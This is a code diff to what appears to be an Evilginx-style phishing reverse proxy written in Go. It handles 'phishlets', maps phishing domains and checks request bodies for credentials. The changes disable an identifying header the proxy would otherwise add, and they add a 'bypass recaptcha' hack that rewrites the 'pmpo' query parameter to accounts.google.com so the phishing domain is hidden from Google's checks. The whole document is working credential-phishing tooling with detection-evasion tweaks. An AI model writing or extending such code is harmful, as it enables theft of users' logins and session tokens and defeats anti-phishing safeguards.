@@ -466,7 +466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -641,13 +641,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// patch GET query params with original domains
+				// // patch GET query params with original domains
+				// if pl != nil {
+				// 	qs := req.URL.Query()
+				// 	if len(qs) > 0 {
+				// 		for gp := range qs {
+				// 			for i, v := range qs[gp] {
+				// 				qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+				// 			}
+				// 		}
+				// 		req.URL.RawQuery = qs.Encode()
+				// 	}
+				// }
+				// patch GET query params with original domains & bypass recaptcha
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								if gp == "pmpo" { // https://accounts.fake-domain.com:443
+									qs[gp][i] = "https%3A%2F%2Faccounts.google.com" // https://accounts.safe-domain.com:443
+								}
+								// if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
+								// 	qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
+								// }
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -656,7 +674,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1076,15 +1094,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			// Function to replace a specific GET parameter in the request URL
-			func replaceGetParam(req *http.Request, paramName, newValue string) {
-				qs := req.URL.Query() // Get the query parameters
-
-				if _, exists := qs[paramName]; exists {
-					qs.Set(paramName, newValue) // Replace the value of the target parameter
-					req.URL.RawQuery = qs.Encode() // Update the URL with the new query string
-				}
-			}
+			
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
@@ -1158,11 +1168,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 						body = []byte(removeObfuscatedDots(string(body)))
-
-						// Additional step to replace a specific GET parameter
-						replaceGetParam(req, "pmpo", "https%3A%2F%2Faccounts.google.com")
-
-						log.Debug(req.URL.Path)
 					}
 				}
 
@@ -1803,9 +1808,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// func (p *HttpProxy) getHomeDir() string {
+// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+// }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
